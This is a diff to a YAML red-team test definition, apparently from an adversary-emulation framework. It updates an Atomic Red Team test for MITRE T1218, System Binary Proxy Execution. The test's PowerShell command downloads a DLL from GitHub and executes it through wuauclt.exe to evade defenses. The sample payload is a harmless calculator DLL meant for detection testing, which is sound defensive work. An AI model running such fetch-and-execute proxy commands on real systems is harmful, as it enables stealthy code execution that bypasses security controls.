@@ -5,15 +5,16 @@
   tactic: stealth
   technique:
     attack_id: T1218
-    name: Signed Binary Proxy Execution
+    name: System Binary Proxy Execution
   platforms:
     windows:
       sh:
         command: 'if (test-path "PathToAtomicsFolder\T1218\bin\calc.dll"){exit 0}
           else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1218\bin\calc.dll")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true"
-          -OutFile "PathToAtomicsFolder\T1218\bin\calc.dll"; fi; wuauclt.exe /UpdateDeploymentProvider
-          "PathToAtomicsFolder\T1218\bin\calc.dll" /RunHandlerComServer'
+          -OutFile "PathToAtomicsFolder\T1218\bin\calc.dll" -UseBasicParsing; fi;
+          wuauclt.exe /UpdateDeploymentProvider "PathToAtomicsFolder\T1218\bin\calc.dll"
+          /RunHandlerComServer'
         cleanup: taskkill /f /im calculator.exe > nul 2>&1
   plugin: atomic
   singleton: false
@@ -21,9 +22,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1218
-  - atomic-red-team
   - stealth
+  - atomic-red-team
+  - t1218
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -42,9 +43,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true"
-        -OutFile "#{arbitrary_dll}"
+        -OutFile "#{arbitrary_dll}" -UseBasicParsing
 
         '
     technique_created: '2018-04-18T17:59:24.739Z'
     atomic_guid: 49fbd548-49e9-4bb7-94a6-3769613912b8
-    import_timestamp: '2026-10-20T07:08:26.578941Z'
+    import_timestamp: '2026-10-21T07:01:49.348533Z'
